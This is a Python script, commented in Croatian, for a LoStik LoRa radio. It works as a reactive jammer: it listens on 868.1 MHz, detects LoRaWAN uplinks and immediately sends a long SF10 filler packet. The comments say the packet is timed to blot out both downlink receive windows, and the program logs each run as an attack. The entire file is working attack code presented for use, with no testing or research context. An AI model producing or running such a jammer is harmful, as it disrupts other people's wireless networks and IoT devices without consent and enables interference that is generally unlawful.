#!/usr/bin/env python3
import time
import serial
import argparse 
from serial.threaded import LineReader, ReaderThread
from datetime import datetime

parser = argparse.ArgumentParser(description='LoStik Long-Sleeve Jammer')
parser.add_argument('port', nargs='?', default='COM11')
args = parser.parse_args()

def get_ms():
    return datetime.now().strftime('%H:%M:%S.%f')[:-3]

class LongSleeveJammer(LineReader):
    def connection_made(self, transport):
        self.transport = transport
        print(f"[{get_ms()}] --- SUSTAV SPREMAN (LONG-SLEEVE MODE) ---")
        self.write_line('sys reset')
        time.sleep(1) 
        self.setup_radio()

    def setup_radio(self):
        self.send_cmd('mac pause')
        self.send_cmd('radio set freq 868100000')
        self.send_cmd('radio set sf sf7')
        self.send_cmd('radio set bw 125')
        self.send_cmd('radio set pwr 14')
        self.send_cmd('radio rx 0')

    def handle_line(self, data):
        data = data.strip()
        
        if data.startswith("radio_rx"):
            # REAGIRAMO ODMAH - bez sleep-a
            # Čim LoStik završi primanje, mi počinjemo slanje koje traje preko 1.5s
            
            print(f"[{get_ms()}] >>> DETEKTIRAN UPLINK. PALIM ŠUM...")
            
            # Prebacujemo na SF10 - ovaj paket traje oko 1.2 sekunde!
            # To će sigurno pokriti i RX1 (na 1s) i RX2 (na 2s) u jednom šutu.
            self.send_cmd('radio set sf sf10', delay=0.01)
            self.write_line("radio tx " + "F" * 200) 
            
            # Dok on šalje taj ogromni paket, mi smo mirni
            time.sleep(2.5) 
            
            print(f"[{get_ms()}] Napad gotov, vraćam na slušanje.")
            self.setup_radio()

    def send_cmd(self, cmd, delay=0.05):
        self.write_line(cmd)
        if delay > 0: time.sleep(delay)

    def write_line(self, text):
        self.transport.write(f'{text}\r\n'.encode())

ser = serial.Serial(args.port, baudrate=57600)
with ReaderThread(ser, LongSleeveJammer) as protocol:
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break